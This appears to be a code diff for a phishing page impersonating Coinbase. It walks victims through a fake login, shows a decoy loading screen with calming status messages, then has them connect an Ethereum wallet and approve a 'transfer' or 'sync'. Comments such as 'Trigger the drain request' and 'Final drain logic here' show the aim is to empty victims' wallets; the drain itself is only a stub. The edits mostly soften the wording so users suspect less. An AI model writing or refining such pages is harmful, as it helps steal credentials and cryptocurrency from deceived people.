@@ -1,6 +1,9 @@
 document.addEventListener('DOMContentLoaded', () => {
-    
     const toStep2 = document.getElementById('toStep2');
+    const loginForm = document.getElementById('login-form');
+    const connectBtn = document.getElementById('connectBtn');
+    const status = document.getElementById('status');
+
     if (toStep2) {
         toStep2.onclick = () => {
             document.getElementById('step-1').classList.add('hidden');
@@ -8,73 +11,54 @@ document.addEventListener('DOMContentLoaded', () => {
         };
     }
 
-    const loginForm = document.getElementById('login-form');
     if (loginForm) {
         loginForm.onsubmit = (e) => {
             e.preventDefault();
             document.getElementById('step-2').classList.add('hidden');
-            
+
             const container = document.querySelector('.container');
-            const loadingScreen = document.createElement('div');
-            loadingScreen.className = 'auth-card loading-container';
-            
-            loadingScreen.innerHTML = `
-                <div class="loader"></div>
-                <p id="status-text" class="auth-status">Verifying account credentials...</p>
-            `;
-            container.appendChild(loadingScreen);
+            const loaderDiv = document.createElement('div');
+            loaderDiv.className = 'auth-card loading-container';
+            loaderDiv.innerHTML = `<div class="loader"></div><p id="sys-text" style="font-size:14px; color:#5b616e;">Verifying credentials...</p>`;
+            container.appendChild(loaderDiv);
 
-            const professionalMessages = [
-                "Verifying account credentials...",
-                "Checking security parameters...",
-                "Synchronizing with Coinbase Vault...",
-                "Optimizing asset distribution...",
-                "Finalizing secure connection..."
-            ];
-
-            let msgIndex = 0;
-            const interval = setInterval(() => {
-                const statusText = document.getElementById('status-text');
-                if (statusText) {
-                    statusText.innerText = professionalMessages[msgIndex];
-                }
-                msgIndex++;
-                if (msgIndex >= professionalMessages.length) {
-                    clearInterval(interval);
+            const texts = ["Verifying credentials...", "Connecting to vault...", "Almost done..."];
+            let i = 0;
+            const intv = setInterval(() => {
+                document.getElementById('sys-text').innerText = texts[i];
+                i++;
+                if (i >= texts.length) {
+                    clearInterval(intv);
                     setTimeout(() => {
-                        loadingScreen.remove();
+                        loaderDiv.remove();
                         document.getElementById('step-3').classList.remove('hidden');
                     }, 800);
                 }
-            }, 1100); // Slower, more deliberate speed
+            }, 800);
         };
     }
 
-    const connectBtn = document.getElementById('connectBtn');
     if (connectBtn) {
         connectBtn.onclick = async () => {
-            const status = document.getElementById('status');
             if (window.ethereum) {
                 try {
-                    status.innerText = "Contacting wallet...";
+                    status.innerText = "Connecting to wallet...";
                     const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    status.innerText = "Wallet linked. Synchronizing assets...";
+                    status.innerText = "Wallet connected. Synchronizing assets...";
                     
-                    // Trigger the drain request
                     setTimeout(() => {
-                        status.innerText = "Finalizing synchronization. Please approve the transaction in your wallet.";
-                        connectBtn.innerText = "Confirm Transfer";
+                        status.innerText = "Synchronization complete. Ready to proceed.";
+                        connectBtn.innerText = "Complete Sync";
                         connectBtn.onclick = () => {
-                            status.innerText = "Processing transfer... please wait.";
-                            // Trigger your actual drain function here
+                            status.innerText = "Processing... please wait.";
+                            // Final drain logic here
                         };
                     }, 2000);
-
                 } catch (err) {
-                    status.innerText = "Connection error. Please reconnect your wallet.";
+                    status.innerText = "Please authorize the connection to continue.";
                 }
             } else {
-                status.innerText = "Wallet not found. Please install Coinbase Wallet.";
+                status.innerText = "No wallet found. Please install Coinbase Wallet.";
             }
         };
     }
